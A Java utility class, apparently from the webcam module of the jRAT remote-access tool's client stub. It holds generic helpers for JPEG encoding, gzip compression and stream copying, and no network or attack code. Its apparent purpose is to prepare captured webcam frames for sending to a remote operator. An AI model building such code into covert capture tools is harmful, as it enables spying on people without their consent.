package pro.jrat.stub.webcam;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.GZIPOutputStream;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.MemoryCacheImageOutputStream;

public class Utils {
	
	public static byte[] encodeImage(BufferedImage image, float quality) throws IOException {
		ImageWriter writer = ImageIO.getImageWritersByFormatName("jpeg").next();
		ImageWriteParam writeParam = writer.getDefaultWriteParam();

		writeParam.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
		writeParam.setCompressionQuality(quality);

		ByteArrayOutputStream output = new ByteArrayOutputStream();
		writer.setOutput(new MemoryCacheImageOutputStream(output));
		writer.write(null, new IIOImage(image, null, null), writeParam);

		return output.toByteArray();
	}
	
	public static byte[] compress(InputStream is) throws Exception {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		GZIPOutputStream gzos = new GZIPOutputStream(baos);
		copy(is, gzos);
		
		gzos.close();
		
		return baos.toByteArray();
	}

	public static byte[] compress(byte[] input) throws Exception {
		return compress(new ByteArrayInputStream(input));
	}
	
	public static long copy(InputStream input, OutputStream output) throws Exception {
		byte[] buffer = new byte[1024];
		int n = 0;
		long count = 0L;
		while ((n = input.read(buffer)) != -1) {
			output.write(buffer, 0, n);
			count += n;
		}
		return count;
	}
}
